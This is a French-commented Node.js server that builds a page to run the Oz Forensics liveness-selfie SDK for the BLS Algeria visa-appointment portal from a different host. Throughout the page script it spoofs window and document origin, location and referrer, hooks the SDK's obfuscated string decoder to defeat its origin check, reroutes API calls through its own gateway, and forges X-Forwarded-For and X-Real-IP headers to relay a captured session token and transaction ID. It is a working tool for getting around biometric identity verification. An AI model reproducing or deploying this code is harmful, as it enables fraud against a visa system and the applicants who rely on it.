    //     location.origin est le VRAI (onrender) → license_origin_error.
    //  3) document.location + self + frames patchés en plus.
    try{Object.defineProperty(document,'location',{configurable:true,get:function(){return window.location;}});}catch(e){}
    try{Object.defineProperty(window,'self',{configurable:true,get:function(){return window;}})}catch(e){}
    try{Object.defineProperty(window,'frames',{configurable:true,get:function(){return window;}})}catch(e){}
    try{Object.defineProperty(window,'length',{configurable:true,get:function(){return 0;}})}catch(e){}

    var __ozSpoofStr='(' + function(){
        var B='https://algeria.blsinternational.com';
        var H='algeria.blsinternational.com';
        var P='/dza/appointment/LivenessRequest';
        try{Object.defineProperty(window,'origin',{configurable:true,get:function(){return B;}});}catch(e){}
        try{Object.defineProperty(window,'top',{configurable:true,get:function(){return window;}});}catch(e){}
        try{Object.defineProperty(window,'parent',{configurable:true,get:function(){return window;}});}catch(e){}
        try{Object.defineProperty(window,'self',{configurable:true,get:function(){return window;}});}catch(e){}
        try{Object.defineProperty(window,'frames',{configurable:true,get:function(){return window;}});}catch(e){}
        try{Object.defineProperty(window,'opener',{configurable:true,get:function(){return null;}});}catch(e){}
        try{Object.defineProperty(window,'length',{configurable:true,get:function(){return 0;}});}catch(e){}
        try{Object.defineProperty(document,'domain',{configurable:true,get:function(){return H;}});}catch(e){}
        try{Object.defineProperty(document,'referrer',{configurable:true,get:function(){return B+'/manage-appointments';}});}catch(e){}
        try{Object.defineProperty(document,'URL',{configurable:true,get:function(){return B+P;}});}catch(e){}
        try{Object.defineProperty(document,'baseURI',{configurable:true,get:function(){return B+P;}});}catch(e){}
        try{Object.defineProperty(document,'defaultView',{configurable:true,get:function(){return window;}});}catch(e){}
        try{Object.defineProperty(document,'location',{configurable:true,get:function(){return window.location;}});}catch(e){}
        // v1.6.2 : PROXY location dans l'iframe aussi (même anneau que la page).
        try{
            var $_rl=window.location;
            var $_fl=new Proxy(Object.create(Object.getPrototypeOf($_rl)),{
                get:function(t,p){
                    if(p==='origin')return B;
                    if(p==='hostname'||p==='host')return H;
                    if(p==='protocol')return 'https:';
                    if(p==='pathname')return P;
                    if(p==='href')return B+P;
                    if(p==='port')return '';
                    if(p==='search'||p==='hash')return '';
                    if(p==='username'||p==='password')return '';
                    if(p==='ancestorOrigins')return [];
                    if(p==='toString'||p==='toLocaleString'||p==='valueOf')return function(){return B+P;};
                    if(p==='assign'||p==='replace'||p==='reload')return function(u){try{return $_rl[p].apply($_rl,arguments);}catch(e){}};
                    var v;try{v=$_rl[p];}catch(e){return undefined;}
                    return (typeof v==='function')?v.bind($_rl):v;
                },
                set:function(t,p,v){try{$_rl[p]=v;}catch(e){}return true;},
                has:function(t,p){try{return p in $_rl;}catch(e){}return false;}
            });
            try{Object.defineProperty(window,'location',{configurable:true,get:function(){return $_fl;}});}catch(e){}
            try{Object.defineProperty(document,'location',{configurable:true,get:function(){return $_fl;}});}catch(e){}
        }catch(e){}
        var L=window.Location&&window.Location.prototype;
        if(L){
            [['origin',function(){return B;}],['hostname',function(){return H;}],['host',function(){return H;}],['protocol',function(){return 'https:';}],['pathname',function(){return P;}],['href',function(){return B+P;}]].forEach(function(a){try{Object.defineProperty(L,a[0],{configurable:true,get:a[1]});}catch(e){}});
            try{Object.defineProperty(L,'toString',{configurable:true,value:function(){return B+P;}});}catch(e){}
            try{Object.defineProperty(L,'toLocaleString',{configurable:true,value:function(){return B+P;}});}catch(e){}
        }
    } +')();';

    function __dzSpoofDoc(doc){
        if(!doc||doc.__dzSpoofed)return;
        try{doc.__dzSpoofed=1;}catch(e){}
        try{
            var s=doc.createElement('script');
            s.textContent=__ozSpoofStr;
            (doc.head||doc.documentElement).appendChild(s);
            setTimeout(function(){try{s.remove();}catch(e){}},50);
        }catch(e){}
    }

    // Surveille les iframes ajoutées par le SDK (rendu même-origine + gateway).
    var __dzFrameTries=0;
    var __dzFrameTimer=setInterval(function(){
        __dzFrameTries++;
        if(__dzFrameTries>120){clearInterval(__dzFrameTimer);return;}
        try{
            var fs=document.querySelectorAll('iframe');
            for(var i=0;i<fs.length;i++){
                var f=fs[i];
                var src='';
                try{src=f.src||'';}catch(e){}
                if(!src||src.indexOf('http')!==0||src.indexOf(window.location.origin)===0){
                    try{if(f.contentWindow&&f.contentWindow.document){__dzSpoofDoc(f.contentWindow.document);}}catch(e){}
                }
            }
        }catch(e){}
    },300);
})();
</script>

<!-- ═══ OZ API HEADER INJECTION ═══ -->
<!-- v1.5.0 : Origin/Referer sont des en-têtes interdits en JS (le navigateur
     les ignore silencieusement) et la gateway les retire de toute façon pour
     coller au flux RÉEL du SDK (aucun Origin/Referer sur tm.php/init.php/
     request.php — capture). On n'injecte plus que X-Forwarded-For / X-Real-IP
     pour la continuité d'IP entre le portail (agent) et le téléphone (client). -->
<script>
(function(){
    var REAL_IP = '${ip}';

    function isOzApi(u){
        if (typeof u === 'string' && u.indexOf('ozforensics.com') !== -1) return true;
        try {
            if (typeof u === 'string' && OZ_GW && (u.indexOf(OZ_GW + '/oz') === 0 || u.indexOf(OZ_GW + '/oz?') === 0)) return true;
        } catch (e) {}
        return false;
    }

    var OZ_GW = '${base}';

    function ozRewrite(u){
        // Réécrit toute URL OZ absolue vers notre gateway (traçage + injection serveur)
        if (typeof u !== 'string' || u.indexOf('ozforensics.com') === -1) return u;
        return OZ_GW + '/oz?u=' + encodeURIComponent(u);
    }

    // Patch fetch
    var _f = window.fetch;
    window.fetch = function(u, o) {
        o = o || {};
        if (isOzApi(u)) {
            if (!o.headers) o.headers = {};
            if (o.headers instanceof Headers) {
                o.headers.set('X-Forwarded-For', REAL_IP);
                o.headers.set('X-Real-IP', REAL_IP);
            } else {
                o.headers['X-Forwarded-For'] = REAL_IP;
                o.headers['X-Real-IP'] = REAL_IP;
            }
            u = ozRewrite(u);
        }
        return _f.call(this, u, o);
    };

    // Patch XMLHttpRequest
    var _xo = XMLHttpRequest.prototype.open;
    var _xs = XMLHttpRequest.prototype.send;
    var _xh = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.open = function(m, u) { this._dzUrl = ozRewrite(u); return _xo.apply(this, arguments); };
    XMLHttpRequest.prototype.send = function() {
        if (isOzApi(this._dzUrl)) {
            try { _xh.call(this, 'X-Forwarded-For', REAL_IP); } catch(e) {}
            try { _xh.call(this, 'X-Real-IP', REAL_IP); } catch(e) {}
        }
        return _xs.apply(this, arguments);
    };
})();
</script>

<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
    <input type="hidden" name="event_session_id" id="event_session_id" value="">
    <input type="hidden" name="LivenessId" id="LivenessId" value="">
    <input type="hidden" name="__RequestVerificationToken" value="">
</form>

<script id="oz-sdk" src="${base}/oz/plugin_liveness.php?ver=1.9.7-29" onerror="window.__ozSdkFail=1;"></script>

<script>
// ═══ v1.7.0 : override du VRAI décodeur de chaînes du SDK (S_GN8.B4.Z_kX3Qe) ═══
// h9.H84/y$U n'existaient PAS (h9t=undefined confirmé) : le namespace réel est
// window.S_GN8 (créé par le loader), décodeur = S_GN8.B4.Z_kX3Qe, exposé via
// S_GN8.o2(idx) et S_GN8.X$(idx) qui .apply le même B4.Z_kX3Qe → un seul hook.
// Usages :
//   1) DUMP : on remonte au serveur (/ozstrings) les valeurs contenant
//      blsinternational.com AVEC leur index → identifier la comparaison exacte.
//   2) OVERRIDE CIBLÉ : si la valeur EST (après trim) précisément
//      'algeria.blsinternational.com' / 'https://...' → renvoyer l'host réel de
//      la page. Le check strict origin === decodeur(idx) devient
//      onrender === onrender → passe. AUCUN renplacement global (ne pas casser
//      les URLs API construites depuis la table).
(function(){
    var __ozT0 = Date.now();
    var __ozIv = setInterval(function(){
        if (Date.now() - __ozT0 > 20000) { clearInterval(__ozIv); return; }
        var S;
        try { S = window.S_GN8 || window['S_GN8']; } catch(e){}
        if (!S || typeof S !== 'object') return;
        var Bo = S.B4;
        if (!Bo || typeof Bo.Z_kX3Qe !== 'function') return;
        clearInterval(__ozIv);
        var ozOrig = Bo.Z_kX3Qe;
        window.__ozO2Log = [];
        Bo.Z_kX3Qe = function(i){
            try {
                var v = ozOrig.apply(Bo, arguments);
                if (typeof v === 'string') {
                    if (/blsinternational\.com/i.test(v) && window.__ozO2Log.length < 120) {
                        window.__ozO2Log.push(i + ':' + v.substring(0, 180));
                    }
                    var m = v.trim();
                    if (m === 'algeria.blsinternational.com') return 'dz34sni-26.onrender.com';
                    if (m === 'https://algeria.blsinternational.com' || m === 'https://algeria.blsinternational.com/') return 'https://dz34sni-26.onrender.com/';
                    if (m === 'http://algeria.blsinternational.com' || m === 'http://algeria.blsinternational.com/') return 'http://dz34sni-26.onrender.com/';
                    if (m === 'app.algeria.blsinternational.com') return 'dz34sni-26.onrender.com';
                    if (m === 'https://app.algeria.blsinternational.com' || m === 'https://app.algeria.blsinternational.com/') return 'https://dz34sni-26.onrender.com/';
                }
                return v;
            } catch (e) { throw e; }
        };
        window.__ozO2Hook = 1;
        try {
            fetch('/ozstrings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ hook: 2, list: window.__ozO2Log.map(function(s){ var k = s.indexOf(':'); return { i: Number(s.substring(0, k)), s: s.substring(k + 1) }; }) })
            }).catch(function(){});
        } catch(e) {}
        try { fetch('/oztrace/log?m=O2HOOKED').catch(function(){}); } catch(e) {}
    }, 200);
    setTimeout(function(){ try { clearInterval(__ozIv); } catch(e) {} }, 22000);
})();
</script>

<script>
function closePage() {
    try { window.close(); } catch (e) {}
    try { history.back(); } catch (e) {}
}

function showSuccess() {
    var screen = document.getElementById('success-screen');
    if (!screen) return;
    screen.style.display = 'flex';
    
    // Generate confetti
    var container = document.getElementById('confetti-container');
    var colors = ['#FFD700','#FF6B35','#F7931E','#4ade80','#60a5fa','#c084fc','#fb7185','#fff'];
    for (var i = 0; i < 60; i++) {
        var d = document.createElement('div');
        d.style.cssText = 'position:absolute;top:-10px;left:' + Math.random()*100 + '%;width:' + (4+Math.random()*8) + 'px;height:' + (4+Math.random()*8) + 'px;background:' + colors[Math.floor(Math.random()*8)] + ';border-radius:' + (Math.random()>.5?'50%':'2px') + ';animation:confetti ' + (2+Math.random()*3) + 's ease-out ' + Math.random()*2 + 's forwards;opacity:0';
        container.appendChild(d);
    }
    
    // Countdown
    var countEl = document.getElementById('countdown');
    var sec = 8;
    var t = setInterval(function() {
        sec--;
        if (countEl) countEl.textContent = String(sec);
        if (sec <= 0) {
            clearInterval(t);
            closePage();
        }
    }, 1000);
}

var SDK_SRC = '${base}/oz/plugin_liveness.php?ver=1.9.7-29';
var __ozSdkTries = 0;
var __ozSdkMaxTries = 8;
var __ozStarted = false;
function __ozTrace(m){try{fetch('/oztrace/log?m='+encodeURIComponent(m)).catch(function(){});}catch(e){}}
    // v1.6.3 : diagnostic profond — localise la fuite d'origine restante.
    function __dzWorkerProbe(){
        if (window.__dzWkProbed) return;
        window.__dzWkProbed = 1;
        window.__dzWkr = 'pending';
        if (typeof Worker === 'undefined' || !window.URL || !URL.createObjectURL) { window.__dzWkr = 'noWorker'; return; }
        try {
            var sn = 'try{postMessage(self.location ? String(self.location.origin) : "no-loc");}catch(e){postMessage("wkrErr");}';
            var b = new Blob([sn], { type: 'text/javascript' });
            var u = URL.createObjectURL(b);
            window.__dzWk = new Worker(u);
            window.__dzWk.onmessage = function(ev){ window.__dzWkr = String(ev.data); try{ this.terminate(); }catch(e){} try{ URL.revokeObjectURL(u); }catch(e){} };
            window.__dzWk.onerror = function(){ window.__dzWkr = 'worker-init-err'; };
        } catch(e){ window.__dzWkr = 'noWorker(' + String(e.message || e).substring(0, 40) + ')'; }
    }
    function __dzDiag(){
        var r = '';
        try { r += 'windowLocOK=' + String(window.__dzLocOK || 0); } catch(e) { r += 'windowLocOK=err'; }
        try { r += ' locProxy=' + (window.location && window.location.__dzProbe ? 1 : 0); } catch(e) {}
        try { var d = Object.getOwnPropertyDescriptor(window, 'location'); r += ' locDesc=' + (d ? ('cfg' + (d.configurable ? 1 : 0)) : 'none'); } catch(e) { r += ' locDesc=err'; }
        try { r += ' wLoc=' + String(window.location.origin); } catch(e) { r += ' wLoc=err'; }
        try { r += ' docO=' + String(document.origin); } catch(e) { r += ' docO=err'; }
        try { r += ' docDomain=' + String(document.domain); } catch(e) { r += ' docDomain=err'; }
        try { r += ' selfO=' + String((self.location && self.location.origin) || ''); } catch(e) { r += ' selfO=err'; }
        try { r += ' gtLocO=' + String((globalThis.location && globalThis.location.origin) || ''); } catch(e) {}
        try { r += ' docURI=' + String(document.documentURI).substring(0, 90); } catch(e) { r += ' docURI=err'; }
        try { var n = performance.getEntriesByType('navigation'); r += ' realNav=' + String((n && n[0] && n[0].name) || '').substring(0, 90); } catch(e) { r += ' realNav=err'; }
        try { r += ' wkr=' + String(window.__dzWkr || 'nots'); } catch(e) { r += ' wkr=err'; }
        try { r += ' o2h=' + String(window.__ozO2Hook || 0) + ' o2n=' + String((window.__ozO2Log || []).length); } catch(e) { r += ' o2h=err'; }
        try { r += ' o2k=' + String(typeof window.S_GN8) + '/' + (window.S_GN8 && window.S_GN8.B4) + '/' + typeof ((window.S_GN8 && window.S_GN8.B4) || {}).Z_kX3Qe; } catch(e) { r += ' o2k=err'; }
        try { r += ' spf=' + String(window.__dzSpoofRan || 0); } catch(e) { r += ' spf=err'; }
        try { r += ' ovW=' + String(window.__dzOvWin || 0) + ' ovL=' + String(window.__dzOvLoc || 0) + ' ovP=' + String(window.__dzOvProto || 0); } catch(e) { r += ' ov=err'; }
        return r;
    }
    // v1.6.4 : remontée systématique de TOUTE erreur selfie (throw sync du SDK
    // OU on_error) → /result:code avec diagnostic. Évite les tests à l'aveugle.
    function __dzReportErr(msg){
        try { __dzWorkerProbe(); } catch(xp) {}
        var _msgForDbg = String(msg).substring(0, 300);
        setTimeout(function(){
            var _t0 = Date.now();
            var _iv = setInterval(function(){
                var _done = window.__dzWkr && window.__dzWkr !== 'pending';
                if (_done || Date.now() - _t0 > 1700) {
                    clearInterval(_iv);
                    var _dbg = '';
                    try { _dbg = __dzDiag(); } catch(xd2) { _dbg = 'diagErr'; }
                    try { var _dd = document.getElementById('diag'); if (_dd) { _dd.textContent = _dbg; _dd.style.display = 'block'; } } catch(xd3) {}
                    var _code = '${cd}';
                    if (_code) {
                        try {
                            fetch('/result/' + encodeURIComponent(_code), {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ status: 'error', error: _msgForDbg, transactionId: '${tid}', realIp: '${ip}', timestamp: Date.now(), debugOrigin: _dbg })
                            }).catch(function(){});
                        } catch (xb) {}
                    }
                }
            }, 250);
        }, 120);
    }

function startSelfie() {
    if (__ozStarted) return;
    __ozStarted = true;
    __ozTrace('OZ startSelfie code=' + ('${cd}'));
    try {
        document.getElementById('st').textContent = '📸 Démarrage selfie...';
        var _st = '${st}';
        // v1.3.1: exact config rejoué du portail BLS (action, result_mode, meta...)
        var _ozCfg = ${JSON.stringify(realCfg).replace(/</g, '\\u003c')};
        _ozCfg.meta = _ozCfg.meta || {};
        if ('${uid}') _ozCfg.meta.user_id = '${uid}';
        // v1.5.0 : transaction_id se situe dans META (config réelle du portail :
        // {"session_token","lang","meta":{"transaction_id"},"action":[...]}).
        // L'injecter au premier niveau divergeait de la capture → retiré.
        if ('${tid}') _ozCfg.meta.transaction_id = '${tid}';
        if (_st) _ozCfg.session_token = _st;
        // filet de secours si le config rejoué est vide (coller à la config réelle)
        if (!_ozCfg.action) _ozCfg.action = ['video_selfie_blank'];
        if (!_ozCfg.lang) _ozCfg.lang = 'en';
        // v1.5.0 : PAS de result_mode / overlay_options forcés — le portail réel
        // n'en envoie pas (SDK v1.9.7-29 a ses propres défauts).
        _ozCfg.on_complete = function(r) {
                var sid = r && r.event_session_id ? String(r.event_session_id) : '';
                if (sid) {
                    document.getElementById('st').textContent = '✅ Selfie OK!';
                    try { document.getElementById('event_session_id').value = sid; } catch(e) {}
                    try { document.getElementById('LivenessId').value = sid; } catch(e) {}
                    if (window.Android) try { window.Android.onSelfieComplete(sid); } catch(ab) {}
                    // AUTO POST result to server (for APK Chrome Custom Tabs support)
                    var _code = '${cd}';
                    if (_code) {
                        fetch('/result/' + encodeURIComponent(_code), {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ event_session_id: sid, status: 'completed', realIp: '${ip}', timestamp: Date.now() })
                        }).catch(function(){});
                    }
                    showSuccess();
                } else {
                    document.getElementById('st').textContent = 'Pas de session ID';
                    if (window.Android) window.Android.onSelfieError('No session ID');
                }
            };
            _ozCfg.on_error = function(e) {
                var msg = e && e.message ? e.message : String(e);
                __ozTrace('OZ ERROR: ' + String(msg).substring(0, 200));
                document.getElementById('st').textContent = 'Erreur: ' + msg;
                if (window.Android) window.Android.onSelfieError(msg);
                __dzReportErr(msg);
            };
            try { fetch('/oztrace?open=1', { cache: 'no-store' }).catch(function(){}); } catch(xd) {}
            // v1.4.0 : on_capture_complete (rare mais présent sur certains flux)
            _ozCfg.on_capture_complete = function(r) {
                try { fetch('/oztrace?cap=1', { cache: 'no-store' }).catch(function(){}); } catch (xc) {}
            };
            OzLiveness.open(_ozCfg);
    } catch(x) {
        document.getElementById('st').textContent = 'Erreur: ' + (x && x.message ? x.message : String(x));
        if (window.Android) window.Android.onSelfieError(x.message);
        __ozTrace('OZ THROW: ' + String(x && x.message ? x.message : x).substring(0, 200));
        __dzReportErr(x && x.message ? x.message : x);
    }
}

function bootOZ() {
    if (typeof OzLiveness !== 'undefined') { __ozTrace('OZ SDK ready → start'); startSelfie(); return; }
    if (__ozSdkTries >= __ozSdkMaxTries) {
        __ozTrace('OZ SDK FAILED to load after ' + __ozSdkMaxTries + ' tries');
        document.getElementById('st').textContent = 'SDK non chargé (CDN injoignable)';
        if (window.Android) window.Android.onSelfieError('SDK not loaded');
        return;
    }
    __ozSdkTries++;
    document.getElementById('st').textContent = 'SDK… tentative ' + __ozSdkTries + '/' + __ozSdkMaxTries;
    // v1.3.2 : si la balise SDK a échoué (onerror), on la recharge proprement
    if (window.__ozSdkFail) {
        window.__ozSdkFail = 0;
        var s = document.getElementById('oz-sdk');
        if (s) {
            var ns = document.createElement('script');
            ns.id = 'oz-sdk';
            ns.src = SDK_SRC;
            ns.onerror = function() { window.__ozSdkFail = 1; };
            ns.onload = function() { window.__ozSdkFail = 0; };
            s.parentNode.replaceChild(ns, s);
        }
        return;
    }
    setTimeout(bootOZ, 1500);
}

window.addEventListener('load', function() {
    try { __dzWorkerProbe(); } catch(xw) {}
    document.getElementById('st').textContent = '🔥 Lancement...';
    setTimeout(bootOZ, 3000);
});
</script>
</body>
</html>`;

    return html;
}

function serveOzPage(req, res, opts) {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(buildOzPage(req, opts));
}

app.get('/oz-page', (req, res) => {
    serveOzPage(req, res, {
        userId: req.query.userId || '',
        transactionId: req.query.transactionId || '',
        realIp: req.query.realIp || '',
        code: req.query.code || req.query.phone || '',
        ua: req.query.ua || ''
    });
});

// v1.6.0 : le SDK OZ peut naviguer top-level vers son URL canonique
// /dza/appointment/LivenessRequest → on resert la page selfie (pas de 404,
// pas de reprise du mode 1 du content script). Paramètres restaurés du cookie.
app.get('/dza*', (req, res) => {
    let last = {};
    try {
        const c = pickCookies(req.headers['cookie'] || '')['dz2ao_last'];
        if (c) last = JSON.parse(c);
    } catch (e) {}
    serveOzPage(req, res, {
        userId: last.userId || (req.query.userId || ''),
        transactionId: last.transactionId || (req.query.transactionId || ''),
        realIp: last.realIp || (req.query.realIp || ''),
        code: last.code || (req.query.code || '')
    });
});

// POST du SDK vers LivenessResponse après selfie → on redonne la page (pas de 404).
app.post('/dza*', (req, res) => {
    let last = {};
    try {
        const c = pickCookies(req.headers['cookie'] || '')['dz2ao_last'];
        if (c) last = JSON.parse(c);
    } catch (e) {}
    serveOzPage(req, res, {
        userId: last.userId || '',
        transactionId: last.transactionId || '',
        realIp: last.realIp || '',
        code: last.code || ''
    });
});

// ═══════════════════════════════════════════
// REC UPLOAD (diagnostic traffic réel depuis le RECORDER de l'extension)
// ═══════════════════════════════════════════

app.post('/rec-upload', (req, res) => {
    const body = req.body || {};
    const rec = {
        at: new Date().toISOString(),
        exportedAt: body.exportedAt || '',
        summary: body.summary || null,
        ozOpenEvents: Array.isArray(body.ozOpenEvents) ? body.ozOpenEvents.slice(-50) : [],
        consoleLogs: Array.isArray(body.consoleLogs) ? body.consoleLogs.slice(-2000) : [],
        entries: Array.isArray(body.entries) ? body.entries.slice(-1500) : []
    };
    REC_UPLOADS.unshift(rec);
    if (REC_UPLOADS.length > 3) REC_UPLOADS.length = 3;
    const s = rec.summary || {};
    console.log(`[REC-UPLOAD] 📥 ${s.requests || '?'} req · ${s.ozOpenCalls || 0} open() OZ · ${s.consoleLogs || '?'} logs console`);
    res.json({ ok: true, id: REC_UPLOADS.length - 1 });
});

app.get('/rec-upload', (req, res) => {
    res.json({ ok: true, count: REC_UPLOADS.length, uploads: REC_UPLOADS });
});

app.get('/rec-upload/status', (req, res) => {
    res.json({ ok: true, count: REC_UPLOADS.length });
});

// ═══════════════════════════════════════════
// HEALTH & STATUS
// ═══════════════════════════════════════════

app.get('/', (req, res) => {
    res.json({
        service: '2AO Selfie',
        version: '1.5.0',
        status: 'running',
        activeTasks: Object.keys(tasks).length,
        activeResults: Object.keys(results).length,
        uptime: Math.floor(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ ok: true, timestamp: Date.now() });
});

app.get('/debug', (req, res) => {
    res.json({
        tasks: Object.keys(tasks).map(c => ({ code: c, userId: (tasks[c].userId || '').substring(0, 10) + '...', age: Math.floor((Date.now() - tasks[c].timestamp) / 1000) + 's' })),
        results: Object.keys(results).map(c => ({ code: c, sessionId: (results[c].event_session_id || '').substring(0, 10) + '...', age: Math.floor((Date.now() - results[c].timestamp) / 1000) + 's' }))
    });
});

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
app.listen(PORT, () => {
    console.log(`\n🔥 2AO Selfie Server v1.5.0`);
    console.log(`   Port: ${PORT}`);
    console.log(`   Ready!\n`);
});
